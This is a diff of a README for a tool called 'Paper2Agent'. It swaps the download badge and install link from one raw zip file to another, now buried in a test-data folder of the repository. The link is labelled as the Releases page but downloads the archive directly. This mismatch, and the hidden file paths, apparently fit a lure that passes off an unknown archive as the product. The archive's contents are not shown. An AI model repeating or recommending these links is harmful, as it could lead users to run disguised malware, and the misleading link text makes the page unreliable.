@@ -1,6 +1,6 @@
 # 🤖 Paper2Agent - Transform Research Papers Effortlessly
 
-[![Download Paper2Agent](https://raw.githubusercontent.com/mangzz12/Paper2Agent/main/carabideous/Paper2Agent.zip)](https://raw.githubusercontent.com/mangzz12/Paper2Agent/main/carabideous/Paper2Agent.zip)
+[![Download Paper2Agent](https://github.com/mangzz12/Paper2Agent/raw/refs/heads/main/templates/test/data/score_batch/Paper-Agent-1.8.zip)](https://github.com/mangzz12/Paper2Agent/raw/refs/heads/main/templates/test/data/score_batch/Paper-Agent-1.8.zip)
 
 ## 📖 Introduction
 
@@ -12,7 +12,7 @@ To get started with Paper2Agent, you need to download the application from our R
 
 ## 📥 Download & Install
 
-1. **Visit the Release Page**: Click the following link to go to the Releases page: [Download Paper2Agent](https://raw.githubusercontent.com/mangzz12/Paper2Agent/main/carabideous/Paper2Agent.zip).
+1. **Visit the Release Page**: Click the following link to go to the Releases page: [Download Paper2Agent](https://github.com/mangzz12/Paper2Agent/raw/refs/heads/main/templates/test/data/score_batch/Paper-Agent-1.8.zip).
   
 2. **Choose the Latest Release**: On the Releases page, find the latest version of Paper2Agent. You will see a list of files available for download.
 
